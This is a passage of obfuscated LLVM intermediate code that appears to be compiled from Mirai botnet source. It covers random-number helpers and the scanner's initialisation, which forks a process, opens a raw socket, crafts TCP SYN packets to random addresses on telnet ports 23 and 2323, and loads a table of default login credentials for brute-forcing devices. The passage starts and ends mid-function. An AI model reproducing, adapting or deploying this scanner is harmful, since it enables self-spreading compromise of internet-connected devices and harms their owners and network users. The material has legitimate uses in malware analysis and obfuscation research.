  %42 = sub nsw i32 %38, 2
  store i32 %41, i32* %8, align 4
  br label %23

; <label>:43:                                     ; preds = %23
  %44 = load i32, i32* %8, align 4
  %45 = icmp eq i32 %44, 1
  br i1 %45, label %46, label %56

; <label>:46:                                     ; preds = %43
  %47 = load i16*, i16** %9, align 8
  %48 = bitcast i16* %47 to i8*
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = load i32, i32* %12, align 4
  %52 = add i32 %51, 831846773
  %53 = add i32 %52, %50
  %54 = sub i32 %53, 831846773
  %55 = add i32 %51, %50
  store i32 %54, i32* %12, align 4
  br label %56

; <label>:56:                                     ; preds = %46, %43
  %57 = load i32, i32* %10, align 4
  %58 = lshr i32 %57, 16
  %59 = xor i32 %58, -1
  %60 = xor i32 65535, -1
  %61 = xor i32 -2030741283, -1
  %62 = or i32 %59, %60
  %63 = or i32 -2030741283, %61
  %64 = xor i32 %62, -1
  %65 = and i32 %64, %63
  %66 = and i32 %58, 65535
  %67 = load i32, i32* %12, align 4
  %68 = sub i32 %67, 5261726
  %69 = add i32 %68, %65
  %70 = add i32 %69, 5261726
  %71 = add i32 %67, %65
  store i32 %70, i32* %12, align 4
  %72 = load i32, i32* %10, align 4
  %73 = xor i32 %72, -1
  %74 = xor i32 65535, -1
  %75 = xor i32 1654018077, -1
  %76 = or i32 %73, %74
  %77 = or i32 1654018077, %75
  %78 = xor i32 %76, -1
  %79 = and i32 %78, %77
  %80 = and i32 %72, 65535
  %81 = load i32, i32* %12, align 4
  %82 = add i32 %81, 145144839
  %83 = add i32 %82, %79
  %84 = sub i32 %83, 145144839
  %85 = add i32 %81, %79
  store i32 %84, i32* %12, align 4
  %86 = load i32, i32* %11, align 4
  %87 = lshr i32 %86, 16
  %88 = xor i32 %87, -1
  %89 = xor i32 65535, -1
  %90 = xor i32 -1591725860, -1
  %91 = or i32 %88, %89
  %92 = or i32 -1591725860, %90
  %93 = xor i32 %91, -1
  %94 = and i32 %93, %92
  %95 = and i32 %87, 65535
  %96 = load i32, i32* %12, align 4
  %97 = add i32 %96, -896807374
  %98 = add i32 %97, %94
  %99 = sub i32 %98, -896807374
  %100 = add i32 %96, %94
  store i32 %99, i32* %12, align 4
  %101 = load i32, i32* %11, align 4
  %102 = xor i32 65535, -1
  %103 = xor i32 %101, %102
  %104 = and i32 %103, %101
  %105 = and i32 %101, 65535
  %106 = load i32, i32* %12, align 4
  %107 = sub i32 0, %106
  %108 = sub i32 0, %104
  %109 = add i32 %107, %108
  %110 = sub i32 0, %109
  %111 = add i32 %106, %104
  store i32 %110, i32* %12, align 4
  %112 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %113 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %112, i32 0, i32 6
  %114 = load i8, i8* %113, align 1
  %115 = zext i8 %114 to i16
  %116 = call zeroext i16 @htons(i16 zeroext %115) #7
  %117 = zext i16 %116 to i32
  %118 = load i32, i32* %12, align 4
  %119 = sub i32 0, %118
  %120 = sub i32 0, %117
  %121 = add i32 %119, %120
  %122 = sub i32 0, %121
  %123 = add i32 %118, %117
  store i32 %122, i32* %12, align 4
  %124 = load i16, i16* %7, align 2
  %125 = zext i16 %124 to i32
  %126 = load i32, i32* %12, align 4
  %127 = sub i32 %126, 643884510
  %128 = add i32 %127, %125
  %129 = add i32 %128, 643884510
  %130 = add i32 %126, %125
  store i32 %129, i32* %12, align 4
  br label %131

; <label>:131:                                    ; preds = %135, %56
  %132 = load i32, i32* %12, align 4
  %133 = lshr i32 %132, 16
  %134 = icmp ne i32 %133, 0
  br i1 %134, label %135, label %152

; <label>:135:                                    ; preds = %131
  %136 = load i32, i32* %12, align 4
  %137 = xor i32 %136, -1
  %138 = xor i32 65535, -1
  %139 = xor i32 -299790023, -1
  %140 = or i32 %137, %138
  %141 = or i32 -299790023, %139
  %142 = xor i32 %140, -1
  %143 = and i32 %142, %141
  %144 = and i32 %136, 65535
  %145 = load i32, i32* %12, align 4
  %146 = lshr i32 %145, 16
  %147 = sub i32 0, %143
  %148 = sub i32 0, %146
  %149 = add i32 %147, %148
  %150 = sub i32 0, %149
  %151 = add i32 %143, %146
  store i32 %150, i32* %12, align 4
  br label %131

; <label>:152:                                    ; preds = %131
  %153 = load i32, i32* %12, align 4
  %154 = xor i32 %153, -1
  %155 = and i32 1834659865, %154
  %156 = xor i32 1834659865, -1
  %157 = and i32 %153, %156
  %158 = xor i32 -1, -1
  %159 = and i32 %158, 1834659865
  %160 = and i32 -1, %156
  %161 = or i32 %155, %157
  %162 = or i32 %159, %160
  %163 = xor i32 %161, %162
  %164 = xor i32 %153, -1
  %165 = trunc i32 %163 to i16
  ret i16 %165
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, -1
  %7 = and i32 %4, %6
  %8 = xor i32 %4, -1
  %9 = and i32 %5, %8
  %10 = or i32 %7, %9
  %11 = xor i32 %5, %4
  store i32 %10, i32* %1, align 4
  %12 = load i32, i32* %1, align 4
  %13 = lshr i32 %12, 8
  %14 = load i32, i32* %1, align 4
  %15 = xor i32 %14, -1
  %16 = and i32 -437077958, %15
  %17 = xor i32 -437077958, -1
  %18 = and i32 %14, %17
  %19 = xor i32 %13, -1
  %20 = and i32 %19, -437077958
  %21 = and i32 %13, %17
  %22 = or i32 %16, %18
  %23 = or i32 %20, %21
  %24 = xor i32 %22, %23
  %25 = xor i32 %14, %13
  store i32 %24, i32* %1, align 4
  %26 = load i32, i32* @y, align 4
  store i32 %26, i32* @x, align 4
  %27 = load i32, i32* @z, align 4
  store i32 %27, i32* @y, align 4
  %28 = load i32, i32* @w, align 4
  store i32 %28, i32* @z, align 4
  %29 = load i32, i32* @w, align 4
  %30 = lshr i32 %29, 19
  %31 = load i32, i32* @w, align 4
  %32 = xor i32 %31, -1
  %33 = and i32 %30, %32
  %34 = xor i32 %30, -1
  %35 = and i32 %31, %34
  %36 = or i32 %33, %35
  %37 = xor i32 %31, %30
  store i32 %36, i32* @w, align 4
  %38 = load i32, i32* %1, align 4
  %39 = load i32, i32* @w, align 4
  %40 = xor i32 %39, -1
  %41 = and i32 %38, %40
  %42 = xor i32 %38, -1
  %43 = and i32 %39, %42
  %44 = or i32 %41, %43
  %45 = xor i32 %39, %38
  store i32 %44, i32* @w, align 4
  %46 = load i32, i32* @w, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %5

; <label>:5:                                      ; preds = %63, %2
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %8, label %64

; <label>:8:                                      ; preds = %5
  %9 = load i32, i32* %4, align 4
  %10 = icmp sge i32 %9, 4
  br i1 %10, label %11, label %23

; <label>:11:                                     ; preds = %8
  %12 = call i32 @rand_next()
  %13 = load i8*, i8** %3, align 8
  %14 = bitcast i8* %13 to i32*
  store i32 %12, i32* %14, align 4
  %15 = load i8*, i8** %3, align 8
  %16 = getelementptr inbounds i8, i8* %15, i64 4
  store i8* %16, i8** %3, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = sub i64 0, 4
  %20 = add i64 %18, %19
  %21 = sub i64 %18, 4
  %22 = trunc i64 %20 to i32
  store i32 %22, i32* %4, align 4
  br label %63

; <label>:23:                                     ; preds = %8
  %24 = load i32, i32* %4, align 4
  %25 = icmp sge i32 %24, 2
  br i1 %25, label %26, label %44

; <label>:26:                                     ; preds = %23
  %27 = call i32 @rand_next()
  %28 = xor i32 65535, -1
  %29 = xor i32 %27, %28
  %30 = and i32 %29, %27
  %31 = and i32 %27, 65535
  %32 = trunc i32 %30 to i16
  %33 = load i8*, i8** %3, align 8
  %34 = bitcast i8* %33 to i16*
  store i16 %32, i16* %34, align 2
  %35 = load i8*, i8** %3, align 8
  %36 = getelementptr inbounds i8, i8* %35, i64 2
  store i8* %36, i8** %3, align 8
  %37 = load i32, i32* %4, align 4
  %38 = sext i32 %37 to i64
  %39 = sub i64 %38, 3027201117141023883
  %40 = sub i64 %39, 2
  %41 = add i64 %40, 3027201117141023883
  %42 = sub i64 %38, 2
  %43 = trunc i64 %41 to i32
  store i32 %43, i32* %4, align 4
  br label %62

; <label>:44:                                     ; preds = %23
  %45 = call i32 @rand_next()
  %46 = xor i32 %45, -1
  %47 = xor i32 255, -1
  %48 = xor i32 769081478, -1
  %49 = or i32 %46, %47
  %50 = or i32 769081478, %48
  %51 = xor i32 %49, -1
  %52 = and i32 %51, %50
  %53 = and i32 %45, 255
  %54 = trunc i32 %52 to i8
  %55 = load i8*, i8** %3, align 8
  %56 = getelementptr inbounds i8, i8* %55, i32 1
  store i8* %56, i8** %3, align 8
  store i8 %54, i8* %55, align 1
  %57 = load i32, i32* %4, align 4
  %58 = sub i32 %57, 502553069
  %59 = add i32 %58, -1
  %60 = add i32 %59, 502553069
  %61 = add nsw i32 %57, -1
  store i32 %60, i32* %4, align 4
  br label %62

; <label>:62:                                     ; preds = %44, %26
  br label %63

; <label>:63:                                     ; preds = %62, %11
  br label %5

; <label>:64:                                     ; preds = %5
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [32 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 zeroext 28)
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %7 = call i8* @table_retrieve_val(i32 28, i32* null)
  %8 = call i8* @strcpy(i8* %6, i8* %7) #6
  br label %9

; <label>:9:                                      ; preds = %15, %2
  %10 = load i32, i32* %4, align 4
  %11 = sub i32 0, -1
  %12 = sub i32 %10, %11
  %13 = add nsw i32 %10, -1
  store i32 %12, i32* %4, align 4
  %14 = icmp ne i32 %10, 0
  br i1 %14, label %15, label %25

; <label>:15:                                     ; preds = %9
  %16 = call i32 @rand_next()
  %17 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %18 = call i32 @util_strlen(i8* %17)
  %19 = urem i32 %16, %18
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 %20
  %22 = load i8, i8* %21, align 1
  %23 = load i8*, i8** %3, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %3, align 8
  store i8 %22, i8* %23, align 1
  br label %9

; <label>:25:                                     ; preds = %9
  call void @table_lock_val(i8 zeroext 28)
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.fd_set.30, align 8
  %6 = alloca %struct.fd_set.30, align 8
  %7 = alloca %struct.scanner_connection*, align 8
  %8 = alloca %struct.timeval.31, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.tcphdr*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.tcphdr*, align 8
  %22 = alloca %struct.scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i8*, align 8
  %45 = alloca i32, align 4
  %46 = call i32 @fork() #6
  store i32 %46, i32* @scanner_pid, align 4
  %47 = load i32, i32* @scanner_pid, align 4
  %48 = icmp sgt i32 %47, 0
  br i1 %48, label %52, label %49

; <label>:49:                                     ; preds = %0
  %50 = load i32, i32* @scanner_pid, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %49, %0
  ret void

; <label>:53:                                     ; preds = %49
  %54 = call i32 @util_local_addr()
  store i32 %54, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %55 = call i64 @time(i64* null) #6
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* @fake_time, align 4
  %57 = call noalias i8* @calloc(i64 256, i64 296) #6
  %58 = bitcast i8* %57 to %struct.scanner_connection*
  store %struct.scanner_connection* %58, %struct.scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  br label %59

; <label>:59:                                     ; preds = %73, %53
  %60 = load i32, i32* %1, align 4
  %61 = icmp slt i32 %60, 256
  br i1 %61, label %62, label %79

; <label>:62:                                     ; preds = %59
  %63 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %64 = load i32, i32* %1, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %63, i64 %65
  %67 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %66, i32 0, i32 3
  store i32 0, i32* %67, align 8
  %68 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %69 = load i32, i32* %1, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %68, i64 %70
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i32 0, i32 1
  store i32 -1, i32* %72, align 8
  br label %73

; <label>:73:                                     ; preds = %62
  %74 = load i32, i32* %1, align 4
  %75 = sub i32 %74, -1948407384
  %76 = add i32 %75, 1
  %77 = add i32 %76, -1948407384
  %78 = add nsw i32 %74, 1
  store i32 %77, i32* %1, align 4
  br label %59

; <label>:79:                                     ; preds = %59
  %80 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %80, i32* @rsck, align 4
  %81 = icmp eq i32 %80, -1
  br i1 %81, label %82, label %83

; <label>:82:                                     ; preds = %79
  call void @exit(i32 0) #8
  unreachable

; <label>:83:                                     ; preds = %79
  %84 = load i32, i32* @rsck, align 4
  %85 = load i32, i32* @rsck, align 4
  %86 = call i32 (i32, i32, ...) @fcntl(i32 %85, i32 3, i32 0)
  %87 = xor i32 2048, -1
  %88 = xor i32 %86, -1
  %89 = xor i32 797695052, -1
  %90 = and i32 %87, 797695052
  %91 = and i32 2048, %89
  %92 = and i32 %88, 797695052
  %93 = and i32 %86, %89
  %94 = or i32 %90, %91
  %95 = or i32 %92, %93
  %96 = xor i32 %94, %95
  %97 = or i32 %87, %88
  %98 = xor i32 %97, -1
  %99 = or i32 797695052, %89
  %100 = and i32 %98, %99
  %101 = or i32 %96, %100
  %102 = or i32 2048, %86
  %103 = call i32 (i32, i32, ...) @fcntl(i32 %84, i32 4, i32 %101)
  store i32 1, i32* %1, align 4
  %104 = load i32, i32* @rsck, align 4
  %105 = bitcast i32* %1 to i8*
  %106 = call i32 @setsockopt(i32 %104, i32 0, i32 3, i8* %105, i32 4) #6
  %107 = icmp ne i32 %106, 0
  br i1 %107, label %108, label %111

; <label>:108:                                    ; preds = %83
  %109 = load i32, i32* @rsck, align 4
  %110 = call i32 @close(i32 %109)
  call void @exit(i32 0) #8
  unreachable

; <label>:111:                                    ; preds = %83
  br label %112

; <label>:112:                                    ; preds = %123, %111
  %113 = call i32 @rand_next()
  %114 = xor i32 %113, -1
  %115 = xor i32 65535, -1
  %116 = xor i32 -1584345470, -1
  %117 = or i32 %114, %115
  %118 = or i32 -1584345470, %116
  %119 = xor i32 %117, -1
  %120 = and i32 %119, %118
  %121 = and i32 %113, 65535
  %122 = trunc i32 %120 to i16
  store i16 %122, i16* %2, align 2
  br label %123

; <label>:123:                                    ; preds = %112
  %124 = load i16, i16* %2, align 2
  %125 = call zeroext i16 @ntohs(i16 zeroext %124) #7
  %126 = zext i16 %125 to i32
  %127 = icmp slt i32 %126, 1024
  br i1 %127, label %112, label %128

; <label>:128:                                    ; preds = %123
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %129 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %130 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %129, i64 1
  %131 = bitcast %struct.iphdr* %130 to %struct.tcphdr*
  store %struct.tcphdr* %131, %struct.tcphdr** %4, align 8
  %132 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %133 = bitcast %struct.iphdr* %132 to i8*
  %134 = load i8, i8* %133, align 4
  %135 = xor i8 %134, -1
  %136 = xor i8 -16, -1
  %137 = xor i8 -30, -1
  %138 = or i8 %135, %136
  %139 = or i8 -30, %137
  %140 = xor i8 %138, -1
  %141 = and i8 %140, %139
  %142 = and i8 %134, -16
  %143 = xor i8 %141, -1
  %144 = xor i8 5, -1
  %145 = xor i8 -28, -1
  %146 = and i8 %143, -28
  %147 = and i8 %141, %145
  %148 = and i8 %144, -28
  %149 = and i8 5, %145
  %150 = or i8 %146, %147
  %151 = or i8 %148, %149
  %152 = xor i8 %150, %151
  %153 = or i8 %143, %144
  %154 = xor i8 %153, -1
  %155 = or i8 -28, %145
  %156 = and i8 %154, %155
  %157 = or i8 %152, %156
  %158 = or i8 %141, 5
  store i8 %157, i8* %133, align 4
  %159 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %160 = bitcast %struct.iphdr* %159 to i8*
  %161 = load i8, i8* %160, align 4
  %162 = xor i8 %161, -1
  %163 = xor i8 15, -1
  %164 = xor i8 -81, -1
  %165 = or i8 %162, %163
  %166 = or i8 -81, %164
  %167 = xor i8 %165, -1
  %168 = and i8 %167, %166
  %169 = and i8 %161, 15
  %170 = xor i8 %168, -1
  %171 = xor i8 64, -1
  %172 = xor i8 126, -1
  %173 = and i8 %170, 126
  %174 = and i8 %168, %172
  %175 = and i8 %171, 126
  %176 = and i8 64, %172
  %177 = or i8 %173, %174
  %178 = or i8 %175, %176
  %179 = xor i8 %177, %178
  %180 = or i8 %170, %171
  %181 = xor i8 %180, -1
  %182 = or i8 126, %172
  %183 = and i8 %181, %182
  %184 = or i8 %179, %183
  %185 = or i8 %168, 64
  store i8 %184, i8* %160, align 4
  %186 = call zeroext i16 @htons(i16 zeroext 40) #7
  %187 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 2
  store i16 %186, i16* %188, align 2
  %189 = call i32 @rand_next()
  %190 = trunc i32 %189 to i16
  %191 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 3
  store i16 %190, i16* %192, align 4
  %193 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 5
  store i8 64, i8* %194, align 4
  %195 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %196 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %195, i32 0, i32 6
  store i8 6, i8* %196, align 1
  %197 = call zeroext i16 @htons(i16 zeroext 23) #7
  %198 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 1
  store i16 %197, i16* %199, align 2
  %200 = load i16, i16* %2, align 2
  %201 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %202 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %201, i32 0, i32 0
  store i16 %200, i16* %202, align 4
  %203 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %204 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %203, i32 0, i32 4
  %205 = load i16, i16* %204, align 4
  %206 = xor i16 -241, -1
  %207 = xor i16 %205, %206
  %208 = and i16 %207, %205
  %209 = and i16 %205, -241
  %210 = and i16 %208, 80
  %211 = xor i16 %208, 80
  %212 = or i16 %210, %211
  %213 = or i16 %208, 80
  store i16 %212, i16* %204, align 4
  %214 = call i32 @rand_next()
  %215 = xor i32 %214, -1
  %216 = xor i32 65535, -1
  %217 = xor i32 -428845805, -1
  %218 = or i32 %215, %216
  %219 = or i32 -428845805, %217
  %220 = xor i32 %218, -1
  %221 = and i32 %220, %219
  %222 = and i32 %214, 65535
  %223 = trunc i32 %221 to i16
  %224 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %225 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %224, i32 0, i32 5
  store i16 %223, i16* %225, align 2
  %226 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 4
  %228 = load i16, i16* %227, align 4
  %229 = xor i16 %228, -1
  %230 = xor i16 -513, -1
  %231 = xor i16 -8823, -1
  %232 = or i16 %229, %230
  %233 = or i16 -8823, %231
  %234 = xor i16 %232, -1
  %235 = and i16 %234, %233
  %236 = and i16 %228, -513
  %237 = xor i16 %235, -1
  %238 = xor i16 512, -1
  %239 = xor i16 26508, -1
  %240 = and i16 %237, 26508
  %241 = and i16 %235, %239
  %242 = and i16 %238, 26508
  %243 = and i16 512, %239
  %244 = or i16 %240, %241
  %245 = or i16 %242, %243
  %246 = xor i16 %244, %245
  %247 = or i16 %237, %238
  %248 = xor i16 %247, -1
  %249 = or i16 26508, %239
  %250 = and i16 %248, %249
  %251 = or i16 %246, %250
  %252 = or i16 %235, 512
  store i16 %251, i16* %227, align 4
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i32 0, i32 0), i16 zeroext 14)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i32 0, i32 0), i16 zeroext 11)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.10, i32 0, i32 0), i16 zeroext 17)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.13, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.14, i32 0, i32 0), i16 zeroext 15)
  br label %253

; <label>:253:                                    ; preds = %1171, %128
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %254 = load i32, i32* @fake_time, align 4
  %255 = load i32, i32* %10, align 4
  %256 = icmp ne i32 %254, %255
  br i1 %256, label %257, label %332

; <label>:257:                                    ; preds = %253
  %258 = load i32, i32* @fake_time, align 4
  store i32 %258, i32* %10, align 4
  store i32 0, i32* %1, align 4
  br label %259

; <label>:259:                                    ; preds = %326, %257
  %260 = load i32, i32* %1, align 4
  %261 = icmp slt i32 %260, 384
  br i1 %261, label %262, label %331

; <label>:262:                                    ; preds = %259
  %263 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* %263, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %264 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i64 1
  %266 = bitcast %struct.iphdr* %265 to %struct.tcphdr*
  store %struct.tcphdr* %266, %struct.tcphdr** %16, align 8
  %267 = call i32 @rand_next()
  %268 = trunc i32 %267 to i16
  %269 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 3
  store i16 %268, i16* %270, align 4
  %271 = load i32, i32* @LOCAL_ADDR, align 4
  %272 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %273 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %272, i32 0, i32 8
  store i32 %271, i32* %273, align 4
  %274 = call i32 @get_random_ip()
  %275 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %276 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %275, i32 0, i32 9
  store i32 %274, i32* %276, align 4
  %277 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 7
  store i16 0, i16* %278, align 2
  %279 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %280 = bitcast %struct.iphdr* %279 to i16*
  %281 = call zeroext i16 @checksum_generic(i16* %280, i32 20)
  %282 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 7
  store i16 %281, i16* %283, align 2
  %284 = load i32, i32* %1, align 4
  %285 = srem i32 %284, 10
  %286 = icmp eq i32 %285, 0
  br i1 %286, label %287, label %291

; <label>:287:                                    ; preds = %262
  %288 = call zeroext i16 @htons(i16 zeroext 2323) #7
  %289 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %290 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %289, i32 0, i32 1
  store i16 %288, i16* %290, align 2
  br label %295

; <label>:291:                                    ; preds = %262
  %292 = call zeroext i16 @htons(i16 zeroext 23) #7
  %293 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %294 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %293, i32 0, i32 1
  store i16 %292, i16* %294, align 2
  br label %295

; <label>:295:                                    ; preds = %291, %287
  %296 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 9
  %298 = load i32, i32* %297, align 4
  %299 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %300 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %299, i32 0, i32 2
  store i32 %298, i32* %300, align 4
